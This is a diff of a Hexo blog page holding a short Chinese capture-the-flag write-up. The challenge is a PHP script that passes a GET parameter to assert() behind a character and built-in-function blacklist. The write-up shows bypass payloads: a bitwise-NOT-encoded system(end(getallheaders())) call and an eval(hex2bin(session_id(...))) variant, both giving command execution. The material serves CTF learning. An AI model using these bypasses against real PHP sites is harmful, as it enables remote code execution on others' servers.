@@ -63,7 +63,7 @@
     <script src="/js/util.js"></script>
     <script src="/js/main.js"></script>
 	
-<meta name="generator" content="Hexo 4.2.1"></head>
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
     
 		
 <!-- Layouts -->
@@ -157,16 +157,27 @@
             <!-- Post -->
             <div class="typo" style="padding: 3rem;">
                 <p>源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;(f|l|a|g|\.|p|h|\&#x2F;|;|\&quot;|\&#39;|\&#96;|\||\[|\]|\_|&#x3D;)&#x2F;i&#39;,$code)) &#123; </span><br><span class="line">        die(&#39;You are too good for me&#39;); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; get_defined_functions()[&#39;internal&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match (&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;im&#39;, $code)) &#123; </span><br><span class="line">            die(&#39;You deserve better&#39;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>第一个过滤掉了一些符号flag.ph中任意的字符，第二个过滤了所有内置函数。</p>
+<pre><code>&lt;?php
+error_reporting(0);
+if(!isset($_GET[&#39;code&#39;])){
+    highlight_file(__FILE__);
+}else{
+    $code = $_GET[&#39;code&#39;];
+    if (preg_match(&#39;/(f|l|a|g|\.|p|h|\/|;|\&quot;|\&#39;|\`|\||\[|\]|\_|=)/i&#39;,$code)) { 
+        die(&#39;You are too good for me&#39;); 
+    }
+    $blacklist = get_defined_functions()[&#39;internal&#39;];
+    foreach ($blacklist as $blackitem) { 
+        if (preg_match (&#39;/&#39; . $blackitem . &#39;/im&#39;, $code)) { 
+            die(&#39;You deserve better&#39;); 
+        } 
+    }
+    assert($code);
+}</code></pre><p>第一个过滤掉了一些符号flag.ph中任意的字符，第二个过滤了所有内置函数。</p>
 <p>利用取反构造system(end(getallheaders()))</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))</span><br><span class="line">()))</span><br></pre></td></tr></table></figure>
-
-<p>利用cookie构造PHPSESSID=命令的hex，也可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure>
-
-<p>这题过滤不怎么严格，取反直接读也可以用，highlight_file(flag.php)</p>
+<pre><code>?code=(~(%8c%86%8c%8b%9a%92))((~(%9a%91%9b))((~(%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c))
+()))</code></pre><p>利用cookie构造PHPSESSID=命令的hex，也可以</p>
+<pre><code>eval(hex2bin(session_id(session_start())));</code></pre><p>这题过滤不怎么严格，取反直接读也可以用，highlight_file(flag.php)</p>
 
             </div>
 
